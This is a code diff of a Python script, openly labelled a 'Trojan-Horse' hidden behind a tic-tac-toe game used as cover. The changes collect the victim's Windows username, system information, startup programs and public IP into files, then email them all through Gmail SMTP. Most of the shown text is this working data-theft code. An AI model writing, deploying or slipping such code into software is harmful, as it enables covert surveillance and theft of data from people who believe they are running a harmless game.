@@ -4,39 +4,34 @@ import os, smtplib, subprocess, requests
 
 ##############################Trojan-Horse#################################
 
+#get the registered username
+data = subprocess.check_output('wmic os get RegisteredUser').decode()
+registered_user = data.split('\n')[1].split()[0]
+
+path1 = f'c:/Users/{registered_user}/yoursystemdatalol.txt'
+path2 = f'c:/Users/{registered_user}/yourprogramsinstalleddatalol.txt'
+path3 = f'c:/Users/{registered_user}/yourpubliciplol.txt'
+
 def send_sys_infs():
-    #get the registered user
-    data = subprocess.check_output('wmic os get RegisteredUser').decode()
-    registered_user = data.split('\n')[1].split()[0]
     #save the system information in a text file
-    path = f'c:/Users/{registered_user}/yourdatalol.txt'
-    os.system(f'systeminfo > {path} 2>&1')
-    file = open(f'c:/Users/{registered_user}/yourdatalol.txt', 'r')
-    sysdata = file.read()
-    #send the data to a mail address from another mail address
-    obj = smtplib.SMTP('smtp.gmail.com', 587)
-    obj.starttls()
-    obj.login('', '')#from mail address and it's password
-    obj.sendmail('', '', sysdata)#from address and to address
-    obj.quit()
+    os.system(f'systeminfo > {path1} 2>&1')
 
 def send_programs_installed():
-    data = subprocess.check_output('wmic product get name,version'.split()).decode()
-    obj = smtplib.SMTP('smtp.gmail.com', 587)
-    obj.starttls()
-    obj.login('', '')#from mail address and it's password
-    obj.sendmail('', '', data)#from address and to address
-    obj.quit()
+    #save the programs installed in a text file
+    data = subprocess.check_output('powershell get-startapps'.split()).decode()
+    file = open(path2, mode='w')
+    file.write(data)
+    file.close()
 
 def public_ip_data():
+    #save the public ip address in a text file
     req_website = 'https://api.ipify.org?format=json'
     req_data = requests.get(req_website).json()
     ip = req_data['ip']
-    obj = smtplib.SMTP('smtp.gmail.com', 587)
-    obj.starttls()
-    obj.login('', '')#from mail address and it's password
-    obj.sendmail('', '', ip)#from address and to address
-    obj.quit()
+    file = open(path3, mode='w')
+    message = f"Victim's public IP: {ip}"
+    file.write(message)
+    file.close()
 
 x1 = threading.Thread(target=send_sys_infs, daemon=True)
 x2 = threading.Thread(target=public_ip_data, daemon=True)
@@ -49,6 +44,17 @@ x3.start()
 x1.join()
 x2.join()
 x3.join()
+
+def sendmail():
+    file1, file2, file3 = open(path1, mode='r'), open(path2, mode='r'), open(path3, mode='r')
+    data1, data2, data3 = file1.read(), file2.read(), file3.read()
+    obj = smtplib.SMTP('smtp.gmail.com', 587)
+    obj.starttls()
+    obj.login('', '') #userid and password for from address
+    obj.sendmail('', '', data1+'\n\n\n'+data2+'\n\n\n'+data3) #from address, to address
+    obj.quit()
+
+sendmail()
 
 ##############################Tic-Tac-Toe(cover)###############################
 def game():
